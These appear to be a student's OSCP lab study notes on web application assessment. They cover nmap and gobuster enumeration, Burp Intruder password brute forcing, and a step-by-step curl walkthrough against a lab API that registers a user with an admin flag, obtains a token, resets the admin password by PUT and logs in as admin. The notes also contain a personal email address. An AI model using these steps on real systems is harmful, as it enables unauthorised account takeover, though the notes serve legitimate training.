## 8.1. Web Application Assessment Methodology

## 8.2. Web Application Assessment Tools

###### 8.2.1. Fingerprinting Web Servers with Nmap 

1. Nmap service scan to grab web server banner
```
sudo nmap -p80  -sV 192.168.50.20
```

2. Initial fingerprinting of the web server
```
sudo nmap -p80 --script=http-enum 192.168.50.20
```

###### 8.2.2. Technology Stack Identification with wappalyzer

1. Wappalyzer app provides all technology stack details. Use sujanp788@gmail.com email with regular password. 

###### 8.2.3. Directory Brute Force with Gobuster

1. Gobuster for directory enumeration 
```
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
# dir for directory enumeration
# u for specify target IP 
# W for specifying wordlist
# t for amount of traffic
```

###### 8.2.4. Security Testing with Burp Suite

1. Following content is enough
2. Login brute forcing with brup suite
a. Intercept the login traffic with wrong credentials. 
b. Send the post traffic to intruder 
c. Clear all the $. 
d. Add $ in password value only. 
c. Add wordlist (Top 10 words from rockyou.txt - cat /usr/share/wordlists/rockyou.txt| head )
d. Copy that and past in payloads > payload options > start attack 
e. Right password will have different status code. 

## 8.3. Web Application Enumeration

##### 8.3.3. Enumerating and Abusing APIs

1. Create pattern file. 
```
┌──(kali㉿kali)-[~/OSCP/8]
└─$ cat pattern                               
{GOBUSTER}/v1
{GOBUSTER}/v2
```

2. Enumerate API with gobuster 
```
 gobuster dir -u http://192.168.228.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

/books/v1             (Status: 200) [Size: 235]
/console              (Status: 200) [Size: 1985]
/ui                   (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
/users/v1             (Status: 200) [Size: 241]
```

3. Check out /users API with curl. 
```
┌──(kali㉿kali)-[~/OSCP/8]
└─$ curl -i http://offsecwp:5002/users/v1
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 316
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Sat, 20 Jan 2024 00:44:51 GMT

{
  "users": [
    {
      "email": "mail1@mail.com", 
      "username": "name1"
    }, 
    {
      "email": "mail2@mail.com", 
      "username": "name2"
    }, 
    {
      "email": "admin@mail.com", 
      "username": "admin"
    }, 
    {
      "email": "pwn@offsec.com", 
      "username": "offsec"
    }
  ]
}
```


3. Check out if we can find further subdirectories within it. 
```
┌──(kali㉿kali)-[~/OSCP/8]
└─$ gobuster dir -u http://offsecwp:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://offsecwp:5002/users/v1/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2024/01/19 19:46:30 Starting gobuster in directory enumeration mode
===============================================================
/email                (Status: 405) [Size: 142]
/password             (Status: 405) [Size: 142]
Progress: 959 / 960 (99.90%)
===============================================================                                                                                             
2024/01/19 19:47:35 Finished                                                                                                                                
===============================================================   
```


4. Check out obtained subdirectory
```
┌──(kali㉿kali)-[~/OSCP/8]
└─$ curl -i http://offsecwp:5002/users/v1/admin/password
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: application/problem+json
Content-Length: 142
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Sat, 20 Jan 2024 00:48:50 GMT

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```


5. Check out if login exist or not. 
```
┌──(kali㉿kali)-[~/OSCP/8]
└─$ curl -i http://offsecwp:5002/users/v1/login         
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 48
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Sat, 20 Jan 2024 00:51:11 GMT

{ "status": "fail", "message": "User not found"}   
```

6. Crafting a POST request against the login API. 
```
┌──(kali㉿kali)-[~/OSCP/8]
└─$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://offsecwp:5002/users/v1/login
{ "status": "fail", "message": "Password is not correct for the given username."}  
```


7. Attempting new User Registration
```
┌──(kali㉿kali)-[~/OSCP/8]
└─$ curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://offsecwp:5002/users/v1/register
{ "status": "fail", "message": "'email' is a required property"} 
```

8. Attempting to register a new user as admin
```
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
```

9. Logging in as an admin user
```
┌──(kali㉿kali)-[~/OSCP/8]
└─$ curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://offsecwp:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MDU3MTI1NDksImlhdCI6MTcwNTcxMjI0OSwic3ViIjoib2Zmc2VjIn0.6lvlt5OnRdvoK-DTace2Ks2GeNElE2NJ702NHpWcKQM", "message": "Successfully logged in.", "status": "success"}  
```

10. Attempting to change the administrator password via a POST request
```
kali@kali:~$ curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MDU3MTI1NDksImlhdCI6MTcwNTcxMjI0OSwic3ViIjoib2Zmc2VjIn0.6lvlt5OnRdvoK-DTace2Ks2GeNElE2NJ702NHpWcKQM' \
  -d '{"password": "pwned"}'

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```


12. Explicitly define it with new token. 
```
┌──(kali㉿kali)-[~/OSCP/8]
└─$ curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://offsecwp:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MDU3MTMxMjUsImlhdCI6MTcwNTcxMjgyNSwic3ViIjoib2Zmc2VjIn0.fXIYEx797n_eOk5GSTNe6WyDsfVQ_CY_Mi2mGsSW9nM", "message": "Successfully logged in.", "status": "success"}   
```

13. Attempting to change the administrator password via a PUT request. 
```
kali@kali:~$ curl -X 'PUT' \
  'http://offsecwp:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MDU3MTMxMjUsImlhdCI6MTcwNTcxMjgyNSwic3ViIjoib2Zmc2VjIn0.fXIYEx797n_eOk5GSTNe6WyDsfVQ_CY_Mi2mGsSW9nM' \
  -d '{"password": "pwned"}'
```

14. Successfully logging in as the admin account. 
```
──(kali㉿kali)-[~/OSCP/8]
└─$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://offsecwp:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MDU3MTMyNDEsImlhdCI6MTcwNTcxMjk0MSwic3ViIjoiYWRtaW4ifQ.ttAeKcrWQfO61PyplcRCVwUN8WNyqoLXAO0kxTJg-Yg", "message": "Successfully logged in.", "status": "success"}  
```




*Lab Exercise*
1. Check out about us page, search directly. 
2. curl -i http://offsecwp:5002/books/v1 
3. Checkout robots.txt and sitemap.xml
4. 



## 8.4. Cross-Site Scripting


## 8.5. Wrapping Up